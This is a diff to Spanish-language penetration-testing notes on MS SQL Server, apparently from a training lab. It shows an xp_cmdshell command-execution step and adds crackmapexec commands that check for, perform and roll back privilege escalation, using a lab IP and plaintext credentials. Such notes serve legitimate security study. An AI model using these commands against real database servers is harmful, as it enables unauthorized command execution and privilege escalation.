@@ -50,3 +50,17 @@ Usualmente usa los puertos tcp/1433 y UDP/1434
 ### 5) ejecutamos
 
     EXECUTE xp_cmdshell 'whoami';
+
+# PE con crackmapexec
+
+### Revisar si podemos elevar privilegios
+    crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv
+### Ejecutar de manera automática la elevación de privilegios
+
+    crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=privesc
+
+Luego vamos poder ejecutar comandos o hacer un rollback
+
+### Hacer rollback de privilegios
+
+    crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=rollback
